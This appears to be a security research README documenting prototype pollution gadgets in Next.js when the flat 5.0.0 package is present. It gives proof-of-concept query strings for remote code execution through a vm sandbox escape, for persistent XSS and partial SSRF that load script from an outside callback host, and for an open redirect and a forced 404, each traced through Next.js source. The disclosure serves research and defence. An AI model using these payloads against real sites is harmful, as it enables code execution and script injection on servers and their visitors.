# Next.js Flat Prototype Pollution

A prototype pollution scenario in [Next.js](https://github.com/vercel/next.js/) when [flat](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927) `5.0.0` is used.

> Video goes here

## Setup Instructions

Install dependencies and start production server.

```sh
npm install
npm run build
npm start
```

## Gadgets

> Lot of unexplored surface. If you find any gadgets, send a pull request :)

| Name                          | Description                                        | Type                          | Package                         | Completed |
| ----------------------------- | -------------------------------------------------- | ----------------------------- | ------------------------------- | :-------: |
| [AMP RCE](#amp-rce)           | via `validator` in `Validator`                     | Remote Code Execution         | `amp-validator`                 |     ✔     |
| [AMP XSS](#amp-xss)           | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | Persistent XSS + Partial SSRF | `@ampproject/toolbox-optimizer` |     ✔     |
| [Redirect SSR](#redirect-ssr) | via `redirect.destination` in `getServerSideProps` | Open Redirect                 | `next`                          |     ✔     |
| [404 SSR](#404-ssr)           | via `notFound` in `getServerSideProps`             | Permanant 404                 | `next`                          |     ✔     |
| More AMP                      |                                                    |                               |                                 |           |
| React Server Components       |                                                    |                               |                                 |           |
| Image & Font Optimization     |                                                    |                               |                                 |           |
| API & Middlewares             |                                                    |                               |                                 |           |
| Router                        |                                                    |                               |                                 |           |
| Prisma                        |                                                    |                               |                                 |           |

## AMP RCE

> Only on `dev` server
> `npm run dev`

**Poc**

```sh
# Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.validator=https://xss-callback.pwnfunction.repl.co/
```

**Cause**

1. Request to any AMP enabled page
2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
3. Request to vulnerable page with `validator` should trigger the RCE.

```js
/* next/server/render.tsx */
const ampState = {
  ampFirst: pageConfig.amp === true,
  hasQuery: Boolean(query.amp),
  hybrid: pageConfig.amp === "hybrid",
};
const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode(ampState) { return ampState.ampFirst || ampState.hybrid && ampState.hasQuery }
// ...
inAmpMode
  ? async (html) => {
      html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);
      if (!renderOpts.ampSkipValidation && renderOpts.ampValidator) {
        await renderOpts.ampValidator(html, pathname);
      }
      return html;
    }
  : null;
```

```js
/* next/dist/server/dev/next-dev-server.js */
const validatorPath =
  this.nextConfig.experimental &&
  this.nextConfig.experimental.amp &&
  this.nextConfig.experimental.amp.validator;
```

```js
/* next/dist/compiled/amphtml-validator/index.js */
function getInstance(e, t) {
  const n = e || "https://cdn.ampproject.org/v0/validator.js";
  const r = t || m;
  if (d.hasOwnProperty(n)) {
    return c.resolve(d[n]);
  }
  const o = isHttpOrHttpsUrl(n) ? readFromUrl(n, r) : readFromFile(n);
  return o.then(function (e) {
    let t;
    try {
      t = new Validator(e);
    } catch (e) {
      throw e;
    }
    d[n] = t;
    return t;
  });
}
```

```js
/* next/dist/compiled/amphtml-validator/index.js */
function Validator(e) {
  this.sandbox = h.createContext();
  try {
    new h.Script(e).runInContext(this.sandbox);
  } catch (e) {
    throw new Error("Could not instantiate validator.js - " + e.message);
  }
}
```

> [nodejs vm module](https://nodejs.org/api/vm.html) simple escape via `Function` - `this.constructor.constructor('return process')()`

## AMP XSS

Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml`.

---

Also a partial SSRF via `node-fetch` during AMP transform.

**Poc**

```sh
# Hosted payload: alert(document.domain)

# XSS on a AMP enabled Page
/vulnerable?__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/

# XSS on a Non-AMP Page (but AMP should be enabled in atleast one other page on the site)
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/

# On production
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampSkipValidation=1&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co

# Partial SSRF - works if route `/*` does not return 404 else server hangs
/vulnerable?__proto__.ampUrlPrefix=https://URL/

```

**Cause**

1. Request to any AMP enabled page
2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
3. Request to vulnerable page with `ampUrlPrefix` should trigger the XSS.

```js
/* next/server/render.tsx */
const ampState = {
  ampFirst: pageConfig.amp === true,
  hasQuery: Boolean(query.amp),
  hybrid: pageConfig.amp === "hybrid",
};
const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode(ampState) { return ampState.ampFirst || ampState.hybrid && ampState.hasQuery }
// ...
html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);

// On production server we skip the error causing validation by pollluting `renderOpts.ampSkipValidation`
if (!renderOpts.ampSkipValidation && renderOpts.ampValidator) {
  await renderOpts.ampValidator(html, pathname);
}
```

```js
/* next/server/optimize-amp.ts */
const optimizer = AmpOptimizer.create(config);
return optimizer.transformHtml(html, config); // config.ampUrlPrefix = 'https://xss-callback.pwnfunction.repl.co/'
```

```js
/* @ampproject/toolbox-optimizer/index.js */
async transformHtml(t, e) {
    const r = await i.parse(t);
    await this.transformTree(r, e);
    return i.serialize(r);
}
```

```js
/* `transformTree` eventually leads to the following */
5690: (t, e, r) => {
    // ...
    class RewriteAmpUrls {
        // ...
        transform(t, e) {
            // ...
            d.push(this._createPreload(l.attribs.src, "script")); // l.attribs.src = 'https://xss-callback.pwnfunction.repl.co/'
            // ...
        }
        // ...
    }
    t.exports = RewriteAmpUrls;
},

// <script async="" src="https://xss-callback.pwnfunction.repl.co/v0.js"></script>
```

> ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.

> 📝 Note (On Dev Server): In `next.config.js`, we skip validation `skipValidation: true`.
> This is to disable `SeparateKeyframes` (`fn 1053`) - eventually throws `filter on undefined` due to prototype pollution. (Lazy fix)

```js
// next.config.js
module.exports = {
  reactStrictMode: true,
  experimental: {
    amp: {
      optimizer: {},
      skipValidation: true,
    },
  },
};
```

✅ On Production server, it doesn't matter because we are skipping validation via `__proto__.ampSkipValidation=1`.

## Redirect SSR

**Poc**

```url
/vulnerable?__proto__.redirect.destination=https://pwnfunction.com
```

**Cause**

```js
/* next/server/render.tsx */
if ("redirect" in data && typeof data.redirect === "object") {
  checkRedirectValues(data.redirect, req, "getServerSideProps");
  data.props = {
    __N_REDIRECT: data.redirect.destination,
    __N_REDIRECT_STATUS: (0, _loadCustomRoutes).getRedirectStatus(
      data.redirect
    ),
  };
  if (typeof data.redirect.basePath !== "undefined") {
    data.props.__N_REDIRECT_BASE_PATH = data.redirect.basePath;
  }
  renderOpts.isRedirect = true;
}
```

## 404 SSR

**Poc**

```url
/vulnerable?__proto__.notFound=1
```

**Cause**

```js
/* next/server/render.tsx */
if ('notFound' in data && data.notFound) {
    if (pathname === '/404') {
        throw new Error(
            `The /404 page can not return notFound in "getStaticProps", please remove it to continue!`
        )
    }

    ;(renderOpts as any).isNotFound = true
    return null
}
```

# Resources

- Prototype pollution attacks in NodeJS applications by Oliver Arteau
  - Video: [Prototype pollution attacks in NodeJS applications](https://www.youtube.com/watch?v=LUsiFV3dsK8)
  - Github: [Paper, Slides and Code](https://github.com/HoLyVieR/prototype-pollution-nsec18)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution) by [Black2Fan](https://twitter.com/Black2Fan)
- A tale of making internet pollution free
  - Slides: [A tale of making internet pollution free](https://speakerdeck.com/s1r1us/a-tale-of-making-internet-pollution-free-bsides-ahmedabad-2021) by [s1r1us](https://twitter.com/S1r1u5_) and [Harsh Jaiswal](https://twitter.com/rootxharsh)
  - Blog post: ["A tale of making internet pollution free" - Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
- [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) by [Michał Bentkowski](https://twitter.com/SecurityMB)
- Javascript prototype pollution by [Rahul Maini](https://twitter.com/iamnoooob) and [Harsh Jaiswal](https://twitter.com/rootxharsh)
  - Video: [Part 1](https://www.youtube.com/watch?v=J3MIOIqvV8w)
  - Video: [Part 2](https://www.youtube.com/watch?v=yDmOXhr8wmw)
